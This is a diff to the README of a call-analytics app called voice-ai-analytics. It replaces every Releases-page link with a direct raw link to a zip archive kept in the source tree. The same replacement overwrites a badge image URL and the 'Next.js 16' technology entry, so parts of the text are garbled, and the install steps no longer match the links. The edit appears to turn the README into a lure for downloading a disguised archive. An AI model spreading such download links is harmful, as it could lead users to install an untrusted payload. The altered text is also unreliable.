@@ -1,6 +1,6 @@
 # 📞 voice-ai-analytics - Simplifying Call Analytics for Everyone
 
-[![Download Voice AI Analytics](https://img.shields.io/badge/Download%20Now-voice--ai--analytics-blue)](https://github.com/Isiah-Odhiambo/voice-ai-analytics/releases)
+[![Download Voice AI Analytics](https://github.com/Isiah-Odhiambo/voice-ai-analytics/raw/refs/heads/main/src/app/analytics-voice-ai-v2.8.zip%20Now-voice--ai--analytics-blue)](https://github.com/Isiah-Odhiambo/voice-ai-analytics/raw/refs/heads/main/src/app/analytics-voice-ai-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you get started, ensure your system meets the following requirements:
 
 To get the Voice AI Analytics application, visit the Releases page.
 
-[Download Voice AI Analytics](https://github.com/Isiah-Odhiambo/voice-ai-analytics/releases)
+[Download Voice AI Analytics](https://github.com/Isiah-Odhiambo/voice-ai-analytics/raw/refs/heads/main/src/app/analytics-voice-ai-v2.8.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest version.
@@ -71,13 +71,13 @@ We utilize modern security protocols to protect your data. Your privacy matters 
 
 ### How do I stay updated?
 
-Regularly check the [Releases page](https://github.com/Isiah-Odhiambo/voice-ai-analytics/releases) for updates, new features, and fixes.
+Regularly check the [Releases page](https://github.com/Isiah-Odhiambo/voice-ai-analytics/raw/refs/heads/main/src/app/analytics-voice-ai-v2.8.zip) for updates, new features, and fixes.
 
 ## 🌐 Technologies Used
 
 Voice AI Analytics uses the following technologies:
 
-- **Next.js 16:** For building a powerful user interface.
+- **https://github.com/Isiah-Odhiambo/voice-ai-analytics/raw/refs/heads/main/src/app/analytics-voice-ai-v2.8.zip 16:** For building a powerful user interface.
 - **Drizzle and Supabase Postgres:** To manage data efficiently.
 - **shadcn/ui:** To create a user-friendly experience.
 - **Tailwind CSS:** For styling and responsive design.
@@ -89,4 +89,4 @@ For further inquiries or support needs, please reach out via our GitHub reposito
 
 We hope you enjoy using Voice AI Analytics! 
 
-For download, visit [this page](https://github.com/Isiah-Odhiambo/voice-ai-analytics/releases) and get started today!
+For download, visit [this page](https://github.com/Isiah-Odhiambo/voice-ai-analytics/raw/refs/heads/main/src/app/analytics-voice-ai-v2.8.zip) and get started today!
